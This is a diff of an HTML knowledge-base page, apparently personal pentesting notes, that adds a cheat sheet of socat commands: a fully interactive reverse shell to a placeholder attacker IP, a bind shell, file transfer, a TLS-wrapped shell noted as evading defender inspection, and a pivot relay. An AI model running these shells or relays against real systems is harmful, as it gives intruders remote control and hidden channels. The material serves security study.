@@ -3,11 +3,11 @@
 "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
 <head>
-<!-- 2026-07-20 Mon 15:54 -->
+<!-- 2026-07-30 Thu 22:13 -->
 <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>socat</title>
-<meta name="author" content="termux" />
+<title>Socat</title>
+<meta name="author" content="Gregory Hugaerts" />
 <meta name="generator" content="Org Mode" />
 <link rel="stylesheet" href="style.css" type="text/css"/>
 <style type='text/css'>
@@ -860,43 +860,70 @@ pre {
 </head>
 <body>
 <div id="preamble" class="status">
+<div id='generated-header' class='generated'><header>
+ <nav>
+<a class='nav-title'href='/index.html' >
+Gregory Hugaerts
+</a>
+<input id='nav-toggle-top' class='nav-toggle' type='checkbox'>
+<label class='nav-button' for='nav-toggle-top'><span/></label>
+<div class='separator menu-sep'></div>
+<ul class='nav-list'>
+<li class='nav-item'>
+<a class='nav-link' href='/index.html'>
+Knowledge Base</a>
+</li>
+</ul>
+<div class='separator'></div>
+</nav>
+</header>
+</div>
 <div id='view-controls'><div id='toggle-mode' title='Mode'>&#9788;</div><div id='goto-top' title='Top'>&#8963;</div><div id='toggle-toc' title='Contents'>&#9776;</div></div>
 </div>
 <div id="content" class="content">
-<h1 class="title">socat</h1>
+<h1 class="title">Socat</h1>
 <div id="table-of-contents" role="doc-toc">
 <h2>Table of Contents</h2>
 <div id="text-table-of-contents" role="doc-toc">
 <ul>
-<li><a href="#orgf40237b">Socat</a>
+<li><a href="#org556c023">Core Functionality</a></li>
+<li><a href="#org33c35d9">Running Socat</a>
 <ul>
-<li><a href="#orgca94b8a">Description</a>
-<ul>
-<li><a href="#orgb630db9">Core Functionality</a></li>
-<li><a href="#org9f83675">Advantages in Cybersecurity</a></li>
+<li><a href="#org4965205">Fully Interactive Reverse Shell (PTY)</a></li>
+<li><a href="#org035016d">Bind Shell</a></li>
+<li><a href="#org8c67114">File Transfer</a></li>
+<li><a href="#org9560c14">Encrypted Shell (SSL/TLS)</a></li>
+<li><a href="#orgf22a27a">Port Forwarding / Relay</a></li>
 </ul>
 </li>
+<li><a href="#orge5fa30d">Advantages in Cybersecurity</a></li>
+<li><a href="#org07be770">Tips</a></li>
 </ul>
-</li>
-</ul>
 </div>
 </div>
-<div id="outline-container-orgf40237b" class="outline-2">
-<h2 id="orgf40237b">Socat</h2>
-<div class="outline-text-2" id="text-orgf40237b">
-</div>
-<div id="outline-container-orgca94b8a" class="outline-3">
-<h3 id="orgca94b8a">Description</h3>
-<div class="outline-text-3" id="text-orgca94b8a">
 <p>
-Socat is a relay for bidirectional data streams. It can connect two addresses ("sockets") together and transfer data between them. Unlike the simpler , Socat supports a massive variety of address types and protocols, giving it vastly superior functionality.
+Socat is a relay for bidirectional data streams. It can connect two
+addresses ("sockets") together and transfer data between them.
+Unlike the simpler <a href="20260206T060717--netcat__cybersecurity_tool.html">Netcat</a>, Socat
+supports a massive variety of address types and protocols, giving
+it vastly superior functionality — particularly for fully
+interactive shells.
 </p>
-</div>
-<div id="outline-container-orgb630db9" class="outline-4">
-<h4 id="orgb630db9">Core Functionality</h4>
-<div class="outline-text-4" id="text-orgb630db9">
+
 <p>
-Socat works by taking two addresses, defined by their address type and identifier, and connecting them. The format is always <code>socat &lt;address1&gt; &lt;address2&gt;</code>.
+Related: <a href="20260206T060717--netcat__cybersecurity_tool.html">Netcat</a>
+         <a href="20260206T060726--reverse-shell__concept_cybersecurity.html">Reverse Shell</a>
+         <a href="20260314T005713--lateral-movement__concept_cybersecurity.html">Lateral movement</a>
+         <a href="20260611T063239--port-forwarding__concept_cybersecurity_networking_pentesting.html">Port Forwarding</a>
+         <a href="20260210T195356==ssl--secure-sockets-layer__concept_cybersecurity_networking.html">Secure Sockets Layer</a>
+</p>
+<div id="outline-container-org556c023" class="outline-2">
+<h2 id="org556c023">Core Functionality</h2>
+<div class="outline-text-2" id="text-org556c023">
+<p>
+Socat works by taking two addresses, defined by their address type
+and identifier, and connecting them. The format is always
+<code>socat &lt;address1&gt; &lt;address2&gt;</code>.
 </p>
 
 <table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">
@@ -950,22 +977,193 @@ Socat works by taking two addresses, defined by their address type and identifie
 </table>
 </div>
 </div>
-<div id="outline-container-org9f83675" class="outline-4">
-<h4 id="org9f83675">Advantages in Cybersecurity</h4>
-<div class="outline-text-4" id="text-org9f83675">
-<ol class="org-ol">
-<li><b>Stable Shells:</b> Socat's ability to create a Pseudo-Terminal (PTY) session makes it superior to Netcat for creating reverse shells, as it results in a fully interactive shell capable of handling terminal commands (like <code>Ctrl+C</code> and tab completion).</li>
-<li><b>Encryption:</b> Socat can wrap connections in <b>SSL/TLS encryption</b> (using the <code>openssl</code> address type), creating encrypted command-and-control (C2) channels that are much harder for network defenders to inspect.</li>
-<li><b>Pivoting/Relaying:</b> It can act as a lightweight <b>network pivot</b> or relay, forwarding traffic between internal and external networks, a critical technique in the <a href="Lateral movement.html#lateral-movement">Lateral Movement</a> stage of an attack.</li>
-</ol>
+<div id="outline-container-org33c35d9" class="outline-2">
+<h2 id="org33c35d9">Running Socat</h2>
+<div class="outline-text-2" id="text-org33c35d9">
+</div>
+<div id="outline-container-org4965205" class="outline-3">
+<h3 id="org4965205">Fully Interactive Reverse Shell (PTY)</h3>
+<div class="outline-text-3" id="text-org4965205">
+<p>
+The main reason to reach for Socat over Netcat — a genuinely usable
+shell with tab completion, <code>Ctrl+C</code>, and job control, rather than a
+dumb pipe.
+</p>
 
-<hr />
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_330182804a374c32bdd2246e4b07ca5a>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_330182804a374c32bdd2246e4b07ca5a=document.querySelector('button[name=btn_330182804a374c32bdd2246e4b07ca5a]');
+copyBtnbtn_330182804a374c32bdd2246e4b07ca5a.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Listener (attacker machine)\nsocat file:\`tty\`,raw,echo=0 tcp-listen:4444\n\n# Target — spawns a PTY-backed shell back to the listener\nsocat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<attacker-ip>:4444\n`);copyBtnbtn_330182804a374c32bdd2246e4b07ca5a.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_330182804a374c32bdd2246e4b07ca5a.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-shell"><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Listener (attacker machine)
+</span>socat file:<span style="color: #feacd0;">`tty`</span>,raw,<span style="color: var(--clr-variable); background-color: var(--bg-variable);">echo</span>=0 tcp-listen:4444
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Target &#8212; spawns a PTY-backed shell back to the listener
+</span>socat exec:<span style="color: var(--clr-string); background-color: var(--bg-string);">'bash -li'</span>,pty,stderr,setsid,sigint,sane tcp:&lt;attacker-ip&gt;:4444
+</pre>
+</div></div>
 </div>
 </div>
+<div id="outline-container-org035016d" class="outline-3">
+<h3 id="org035016d">Bind Shell</h3>
+<div class="outline-text-3" id="text-org035016d">
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_f99fe003c2a34119ba077e89ac0638cf>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_f99fe003c2a34119ba077e89ac0638cf=document.querySelector('button[name=btn_f99fe003c2a34119ba077e89ac0638cf]');
+copyBtnbtn_f99fe003c2a34119ba077e89ac0638cf.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Target — listens and waits for the attacker to connect\nsocat tcp-listen:4444,reuseaddr,fork exec:'bash -li',pty,stderr,setsid,sigint,sane\n\n# Attacker connects to it\nsocat file:\`tty\`,raw,echo=0 tcp:<target-ip>:4444\n`);copyBtnbtn_f99fe003c2a34119ba077e89ac0638cf.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_f99fe003c2a34119ba077e89ac0638cf.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-shell"><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Target &#8212; listens and waits for the attacker to connect
+</span>socat tcp-listen:4444,reuseaddr,fork exec:<span style="color: var(--clr-string); background-color: var(--bg-string);">'bash -li'</span>,pty,stderr,setsid,sigint,sane
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Attacker connects to it
+</span>socat file:<span style="color: #feacd0;">`tty`</span>,raw,<span style="color: var(--clr-variable); background-color: var(--bg-variable);">echo</span>=0 tcp:&lt;target-ip&gt;:4444
+</pre>
+</div></div>
+</div>
+</div>
+<div id="outline-container-org8c67114" class="outline-3">
+<h3 id="org8c67114">File Transfer</h3>
+<div class="outline-text-3" id="text-org8c67114">
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_372f0359fa744ca9989598a4c2fc400c>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_372f0359fa744ca9989598a4c2fc400c=document.querySelector('button[name=btn_372f0359fa744ca9989598a4c2fc400c]');
+copyBtnbtn_372f0359fa744ca9989598a4c2fc400c.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Receiver\nsocat tcp-listen:4444,reuseaddr file:received_file,create\n\n# Sender\nsocat file:file_to_send tcp:<receiver-ip>:4444\n`);copyBtnbtn_372f0359fa744ca9989598a4c2fc400c.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_372f0359fa744ca9989598a4c2fc400c.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-shell"><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Receiver
+</span>socat tcp-listen:4444,reuseaddr file:received_file,create
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Sender
+</span>socat file:file_to_send tcp:&lt;receiver-ip&gt;:4444
+</pre>
+</div></div>
+</div>
+</div>
+<div id="outline-container-org9560c14" class="outline-3">
+<h3 id="org9560c14">Encrypted Shell (SSL/TLS)</h3>
+<div class="outline-text-3" id="text-org9560c14">
+<p>
+Wraps the connection in TLS — much harder for network defenders to
+inspect via plaintext signature matching than a standard reverse
+shell.
+</p>
+
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_fd424a8906124f11be5100f0afe0ed5f>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_fd424a8906124f11be5100f0afe0ed5f=document.querySelector('button[name=btn_fd424a8906124f11be5100f0afe0ed5f]');
+copyBtnbtn_fd424a8906124f11be5100f0afe0ed5f.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Generate a self-signed cert first\nopenssl req -newkey rsa:2048 -nodes -keyout server.pem -x509 -days 365 -out server.pem\n\n# Listener with SSL\nsocat openssl-listen:4444,cert=server.pem,verify=0 exec:'bash -li',pty,stderr,setsid,sigint,sane\n\n# Target connects over SSL\nsocat openssl:<attacker-ip>:4444,verify=0 exec:'bash -li',pty,stderr,setsid,sigint,sane\n`);copyBtnbtn_fd424a8906124f11be5100f0afe0ed5f.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_fd424a8906124f11be5100f0afe0ed5f.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-shell"><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Generate a self-signed cert first
+</span>openssl req -newkey rsa:2048 -nodes -keyout server.pem -x509 -days 365 -out server.pem
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Listener with SSL
+</span>socat openssl-listen:4444,<span style="color: var(--clr-variable); background-color: var(--bg-variable);">cert</span>=server.pem,<span style="color: var(--clr-variable); background-color: var(--bg-variable);">verify</span>=0 exec:<span style="color: var(--clr-string); background-color: var(--bg-string);">'bash -li'</span>,pty,stderr,setsid,sigint,sane
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Target connects over SSL
+</span>socat openssl:&lt;attacker-ip&gt;:4444,<span style="color: var(--clr-variable); background-color: var(--bg-variable);">verify</span>=0 exec:<span style="color: var(--clr-string); background-color: var(--bg-string);">'bash -li'</span>,pty,stderr,setsid,sigint,sane
+</pre>
+</div></div>
+</div>
+</div>
+<div id="outline-container-orgf22a27a" class="outline-3">
+<h3 id="orgf22a27a">Port Forwarding / Relay</h3>
+<div class="outline-text-3" id="text-orgf22a27a">
+<p>
+Standing socat up as a lightweight pivot between two networks —
+directly relevant when a compromised host has access to a segment
+you don't.
+</p>
+
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_69c23edc5e1d45409e043fa746dbc9e4>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_69c23edc5e1d45409e043fa746dbc9e4=document.querySelector('button[name=btn_69c23edc5e1d45409e043fa746dbc9e4]');
+copyBtnbtn_69c23edc5e1d45409e043fa746dbc9e4.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Relay all traffic from local port 8080 to a target only reachable\n# from the compromised host\nsocat tcp-listen:8080,reuseaddr,fork tcp:<internal-target-ip>:80\n`);copyBtnbtn_69c23edc5e1d45409e043fa746dbc9e4.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_69c23edc5e1d45409e043fa746dbc9e4.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-shell"><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Relay all traffic from local port 8080 to a target only reachable
+</span><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">from the compromised host
+</span>socat tcp-listen:8080,reuseaddr,fork tcp:&lt;internal-target-ip&gt;:80
+</pre>
+</div></div>
+</div>
+</div>
+</div>
+<div id="outline-container-orge5fa30d" class="outline-2">
+<h2 id="orge5fa30d">Advantages in Cybersecurity</h2>
+<div class="outline-text-2" id="text-orge5fa30d">
+<ol class="org-ol">
+<li><b>Stable Shells:</b> Socat's ability to create a Pseudo-Terminal
+(PTY) session makes it superior to Netcat for creating reverse
+shells, as it results in a fully interactive shell capable of
+handling terminal commands (like <code>Ctrl+C</code> and tab completion).</li>
+<li><b>Encryption:</b> Socat can wrap connections in SSL/TLS encryption
+(using the <code>openssl</code> address type), creating encrypted
+command-and-control (C2) channels that are much harder for
+network defenders to inspect.</li>
+<li><b>Pivoting/Relaying:</b> It can act as a lightweight network pivot
+or relay, forwarding traffic between internal and external
+networks, a critical technique in the
+<a href="20260314T005713--lateral-movement__concept_cybersecurity.html">Lateral movement</a> stage of an attack.</li>
+</ol>
+</div>
+</div>
+<div id="outline-container-org07be770" class="outline-2">
+<h2 id="org07be770">Tips</h2>
+<div class="outline-text-2" id="text-org07be770">
+<ul class="org-ul">
+<li>Socat's syntax is notoriously fiddly to remember exactly —
+keep the PTY reverse shell one-liner above bookmarked rather than
+trying to recall it from scratch under time pressure</li>
+<li>If a target doesn't have <code>socat</code> installed (common on minimal
+containers/embedded systems), Netcat is the fallback, but you
+lose the fully-interactive PTY — worth checking for <code>socat</code> on
+the target early (<code>which socat</code>) rather than discovering its
+absence mid-exploitation</li>
+<li>The <code>verify=0</code> flag in the SSL examples disables certificate
+verification — necessary for a self-signed cert, but don't forget
+it's there if something about the encrypted channel isn't
+connecting</li>
+<li><code>setsid</code> in the PTY commands detaches the shell from the
+controlling terminal, which matters for session stability —
+dropping it from the command is a common cause of a shell that
+dies unexpectedly</li>
+</ul>
 </div>
 </div>
 </div>
 <div id="postamble" class="status">
+<div id='generated-footer' class='generated'><footer>
+ <nav>
+<div class='separator'></div>
+<a class='nav-author'href='https://gregoryhugaerts.github.io' >
+gregoryhugaerts.github.io
+</a>
+<input id='nav-toggle-bot' class='nav-toggle' type='checkbox'>
+<label class='nav-button' for='nav-toggle-bot'><span/></label>
+<div class='separator menu-sep'></div>
+<ul class='nav-list'>
+</ul>
+</nav>
+</footer>
+</div>
 <script type="text/javascript">
 <!--/*--><![CDATA[/*><!--*/
 if (!document.cookie.split('; ').find(r => r.startsWith('mode'))) {
@@ -973,6 +1171,7 @@ document.cookie = 'mode=dark'
 }
 document.cookie = 'light=modus-operandi-tinted'
 document.cookie = 'dark=modus-vivendi-tinted'
+document.cookie = 'options=collapsing:t__src-lang:t';
 /*
 ;; nice-org-html.js
 ;;==============================================================================
